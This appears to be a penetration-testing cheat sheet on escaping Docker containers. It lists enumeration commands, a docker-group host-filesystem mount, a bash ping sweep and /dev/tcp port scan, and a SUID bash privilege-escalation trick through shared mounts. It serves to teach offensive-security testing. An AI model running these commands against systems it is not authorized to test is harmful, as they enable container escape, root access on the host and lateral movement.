---
icon: docker
---

# Escaping Docker

{% hint style="info" %}
### <mark style="color:purple;">`Enumeration`</mark>

<mark style="color:purple;">**Check for the Presence of**</mark> <mark style="color:orange;">**`.dockerenv`**</mark>

* <mark style="color:purple;">Finding this file can confirm you're inside a container and give insight into the container environment.</mark>
* <mark style="color:purple;">Tools like</mark> <mark style="color:orange;">**`nsenter`**</mark> <mark style="color:purple;">or</mark> <mark style="color:orange;">**`docker-exploit`**</mark> <mark style="color:purple;">can be used to attempt escaping the container.</mark>
* <mark style="color:purple;">If the user is in the</mark> <mark style="color:orange;">**`docker`**</mark> <mark style="color:purple;">group, attempt to run the following command to mount the host filesystem and gain access to the host:</mark>

```sh
docker run -v /:/mnt -it bash bash
```

<mark style="color:red;">**`Identify Active Containers`**</mark>

* <mark style="color:purple;">List all running containers:</mark>

```sh
docker ps
```

* <mark style="color:purple;">Check for containers running with elevated privileges (</mark><mark style="color:orange;">**`--privileged`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`--cap-add`**</mark><mark style="color:purple;">).</mark>
* <mark style="color:purple;">Look for containers that share host namespaces or file systems.</mark>

<mark style="color:red;">**`Check for Docker Images (Local Images on Host)`**</mark>

```sh
docker images
```

<mark style="color:red;">**`Check for File Permissions Showing Numeric IDs`**</mark>

* <mark style="color:purple;">When the host's user information does not exist inside the container’s</mark> <mark style="color:orange;">**`/etc/passwd`**</mark> <mark style="color:purple;">file, file permissions will show numeric IDs instead of human-readable names.</mark>

<mark style="color:red;">**`Check for Access to Host Network Information`**</mark>

* <mark style="color:purple;">This file contains the routing table of the host system and can provide valuable insights into the host network that may help in lateral movement or further attacks:</mark>

```sh
cat /proc/net/fib_trie
```

<mark style="color:red;">**`Check for Mounted File Systems`**</mark>

* <mark style="color:purple;">Mounting directories or files from the host system into the container exposes host data to the container:</mark>

```sh
cat /proc/mounts
```

```sh
mount | grep <directory>
```

<mark style="color:red;">**`Verify Container Privileges`**</mark>

* <mark style="color:purple;">Look for containers running as root or with</mark> <mark style="color:orange;">**`--privileged`**</mark> <mark style="color:purple;">mode:</mark>

{% code title="Container’s settings" %}
```sh
docker inspect
```
{% endcode %}

* <mark style="color:purple;">See if it is running as root:</mark>

```sh
cat /proc/self/status
```

* <mark style="color:purple;">Check the process inside the container:</mark>

```sh
ps aux
```

<mark style="color:red;">**`Test for Namespace Leaks`**</mark>

* <mark style="color:purple;">Check the namespaces that the container uses:</mark>

```sh
cat /proc/self/ns/
```

<mark style="color:red;">**`Investigate Container File System for SUID/SGID Binaries`**</mark>

```sh
find / -type f \( -perm -4000 -o -perm -2000 \)
```

<mark style="color:red;">**`Check for Docker Socket Exposure`**</mark>

```sh
mount | grep docker.sock
```

<mark style="color:red;">**`Look for Docker Vulnerabilities and Misconfigurations`**</mark>

```sh
cat /etc/docker/daemon.json
```

<mark style="color:red;">**`Investigate the private virtual network`**</mark>

* <mark style="color:purple;">Docker containers typically run in a private virtual network created by Docker, and the default network uses a subnet in the range</mark> <mark style="color:orange;">**`172.16.0.0/12`**</mark>

{% code title="Ping Sweep" overflow="wrap" %}
```bash
for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
```
{% endcode %}

{% code title="Port Scan" overflow="wrap" %}
```bash
for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
```
{% endcode %}
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:red;">**`File Ownership Manipulation via Shared Mounts`**</mark>

* <mark style="color:purple;">Check permissions and ownership when you create a file from host and container:</mark>

{% code lineNumbers="true" %}
```sh
touch from_host
touch from_container
```
{% endcode %}

* <mark style="color:purple;">If the container is miss configured and can creates files as a</mark> <mark style="color:orange;">**`root`**</mark><mark style="color:purple;">, and you can access the files created by the host on the container:</mark>&#x20;
  1. <mark style="color:orange;">**`From the host`**</mark><mark style="color:purple;">, copy</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">in to the mounted directory.</mark>
  2. <mark style="color:orange;">**`From the container`**</mark><mark style="color:purple;">, change the ownership and permissions of</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">to</mark> <mark style="color:orange;">**`root`**</mark><mark style="color:purple;">.</mark>
  3. <mark style="color:purple;">Execute</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">as</mark> <mark style="color:orange;">**`root`**</mark><mark style="color:purple;">.</mark>

{% code overflow="wrap" lineNumbers="true" %}
```bash
cp /bin/bash .
chown root:root bash; chmod 4777 bash
./bash -p
```
{% endcode %}
{% endhint %}

***

